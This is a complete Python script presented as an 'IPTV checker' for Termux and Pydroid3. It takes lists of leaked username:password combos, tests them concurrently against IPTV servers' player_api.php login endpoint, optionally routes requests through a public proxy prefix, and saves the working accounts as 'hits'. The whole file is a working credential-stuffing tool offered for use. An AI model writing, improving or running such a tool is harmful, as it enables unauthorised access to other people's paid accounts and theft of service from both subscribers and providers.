#!/usr/bin/env python3
"""
DevEriik.py
Simple IPTV checker for Termux / Pydroid3.
- Supports combos in formats: user:pass, user:pass:host, user:pass@host
- Supports M3U URLs (get.php?username=..&password=..)
- Uses requests + ThreadPoolExecutor for concurrency (install `requests`)

Usage examples:
  python3 DevEriik.py --input combos.txt --threads 20 --timeout 8 --server http://example.com:8080

"""
import subprocess
import os
import sys as _sys_boot
# Auto-install dependencies (requests) when running in Termux / Pydroid3
try:
    import requests
except Exception:
    print('Dependencias faltantes: instalando requirements.txt...')
    try:
        subprocess.check_call([_sys_boot.executable, '-m', 'pip', 'install', '--upgrade', 'pip'])
    except Exception:
        pass
    try:
        req_path = os.path.join(os.path.dirname(__file__), 'requirements.txt')
        subprocess.check_call([_sys_boot.executable, '-m', 'pip', 'install', '-r', req_path])
    except Exception as e:
        print('Error instalando dependencias:', e)
        sys.exit(1)
    try:
        import requests
    except Exception as e:
        print('No se pudo importar requests tras la instalación:', e)
        sys.exit(1)

from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import random
import string
import sys
import time
from urllib.parse import urlparse, parse_qs, quote_plus
import requests


VERSION = "1.0"


def generate_random_string(n=4):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))


def generate_filename(prefix='DevEriik'):
    return f"{prefix}_{generate_random_string(5)}.txt"


def normalize_server_url(host):
    if not host:
        return None
    v = host.strip()
    v = v.replace(' ', '')
    if not v:
        return None
    if not v.lower().startswith('http://') and not v.lower().startswith('https://'):
        v = 'http://' + v
    # remove trailing slashes
    while v.endswith('/'):
        v = v[:-1]
    return v


def parse_combo(line):
    line = line.strip()
    if not line:
        return None

    # M3U URL detection (get.php or type=m3u)
    if 'get.php' in line or 'type=m3u' in line:
        try:
            parsed = urlparse(line)
            qs = parse_qs(parsed.query)
            user = qs.get('username', [None])[0]
            pas = qs.get('password', [None])[0]
            host = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else None
            return {'type': 'm3u', 'user': user, 'pass': pas, 'host': host}
        except Exception:
            return None

    # user:pass@host format
    if '@' in line:
        try:
            cred, host_part = line.split('@', 1)
            cu = cred.split(':')
            if len(cu) >= 2 and host_part:
                return {'type': 'combo', 'user': cu[0], 'pass': cu[1], 'host': host_part}
        except Exception:
            pass

    # colon-separated formats user:pass:host or user:pass
    parts = line.split(':')
    if len(parts) >= 3:
        return {'type': 'combo', 'user': parts[0], 'pass': parts[1], 'host': ':'.join(parts[2:])}
    if len(parts) == 2:
        return {'type': 'combo', 'user': parts[0], 'pass': parts[1], 'host': None}

    return None


def check_account(combo, default_host=None, timeout=8, proxy_prefix=None, user_agent=None):
    """Return dict with status: active/expired/error and extra fields"""
    raw_host = combo.get('host') or default_host
    server = normalize_server_url(raw_host)
    if not server:
        return {'status': 'skip', 'reason': 'no_host', 'input': combo}

    user = combo.get('user')
    pas = combo.get('pass')

    check_url = f"{server}/player_api.php?username={user}&password={pas}"

    if proxy_prefix:
        # proxy_prefix is expected as something like https://api.allorigins.win/raw?url=
        url = proxy_prefix + quote_plus(check_url)
    else:
        url = check_url

    headers = {}
    if user_agent:
        headers['User-Agent'] = user_agent

    try:
        r = requests.get(url, timeout=timeout, headers=headers)
    except Exception as e:
        return {'status': 'error', 'message': str(e), 'user': user, 'pass': pas, 'host': server}

    if r.status_code != 200:
        return {'status': 'error', 'message': f'HTTP {r.status_code}', 'user': user, 'pass': pas, 'host': server}

    text = r.text
    # try parse json
    try:
        j = r.json()
    except Exception:
        j = None

    if j and isinstance(j, dict) and ('user_info' in j or 'user' in j):
        info = j.get('user_info', j)
        status_field = info.get('status') if isinstance(info, dict) else None
        status = 'active' if status_field and str(status_field).lower() == 'active' else 'active' if 'active' in str(text).lower() else 'expired'

        days = None
        try:
            if isinstance(info, dict):
                if 'exp_date' in info and info['exp_date']:
                    # exp_date is often unix timestamp
                    try:
                        days = int((int(info['exp_date']) - int(time.time())) / (60*60*24))
                    except Exception:
                        days = None
        except Exception:
            days = None

        return {'status': status, 'user': user, 'pass': pas, 'host': server, 'daysRemaining': days or 0, 'raw': text}

    # fallback heuristics
    low = text.lower()
    if 'active' in low and 'invalid' not in low and 'expired' not in low:
        return {'status': 'active', 'user': user, 'pass': pas, 'host': server, 'daysRemaining': 0, 'raw': text}

    if 'expired' in low or 'invalid' in low or 'wrong' in low:
        return {'status': 'expired', 'user': user, 'pass': pas, 'host': server}

    # otherwise consider expired
    return {'status': 'expired', 'user': user, 'pass': pas, 'host': server}


def load_input_lines(path_or_dash):
    if path_or_dash == '-':
        return [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
    with open(path_or_dash, 'r', encoding='utf-8', errors='ignore') as f:
        return [l.strip() for l in f.readlines() if l.strip()]


def main():
    parser = argparse.ArgumentParser(description='DevEriik IPTV Checker (Termux / Pydroid3 friendly)')
    parser.add_argument('--input', '-i', required=True, help='Input file with combos (one per line) or - for stdin')
    parser.add_argument('--server', '-s', help='Default server/host to use when combos lack host (e.g. http://host:8080)')
    parser.add_argument('--threads', '-t', type=int, default=10, help='Concurrency threads')
    parser.add_argument('--timeout', type=int, default=8, help='HTTP timeout in seconds')
    parser.add_argument('--proxy', help='Optional proxy prefix (ex: https://api.allorigins.win/raw?url=)')
    parser.add_argument('--user-agent', help='Custom User-Agent header')
    parser.add_argument('--out', '-o', help='Output file (defaults to generated name)')
    parser.add_argument('--prefix', default='DevEriik', help='Output file prefix')
    args = parser.parse_args()

    try:
        lines = load_input_lines(args.input)
    except Exception as e:
        print('Error loading input:', e)
        sys.exit(1)

    parsed = []
    for ln in lines:
        p = parse_combo(ln)
        if p:
            parsed.append(p)
        else:
            print('[SKIP] Invalid format:', ln)

    if not parsed:
        print('No valid combos parsed.')
        sys.exit(0)

    out_file = args.out or generate_filename(args.prefix)
    hits = []

    default_host = args.server

    total = len(parsed)
    print(f'Starting check: {total} combos, threads={args.threads}, timeout={args.timeout}s')

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = {ex.submit(check_account, combo, default_host, args.timeout, args.proxy, args.user_agent): combo for combo in parsed}
        completed = 0
        for fut in as_completed(futures):
            res = fut.result()
            completed += 1
            # simple progress
            sys.stdout.write(f'\rProgress: {completed}/{total} ')
            sys.stdout.flush()

            if res.get('status') == 'active':
                hits.append(res)
                print(f"\n[HIT] {res.get('user')}:{res.get('pass')} @ {res.get('host')} (days:{res.get('daysRemaining')})")
            elif res.get('status') == 'expired':
                # keep minimal output
                pass
            elif res.get('status') == 'skip':
                print(f"\n[SKIP] missing host for input: {res.get('input')}")
            else:
                # error
                print(f"\n[ERR] {res.get('user')} - {res.get('message')}")

    # export hits
    if hits:
        with open(out_file, 'w', encoding='utf-8') as f:
            for h in hits:
                line = f"{h.get('user')}:{h.get('pass')}@{h.get('host')} # days={h.get('daysRemaining')}\n"
                f.write(line)
        print(f'\nExported {len(hits)} hits to {out_file}')
    else:
        print('\nNo hits found.')


if __name__ == '__main__':
    main()
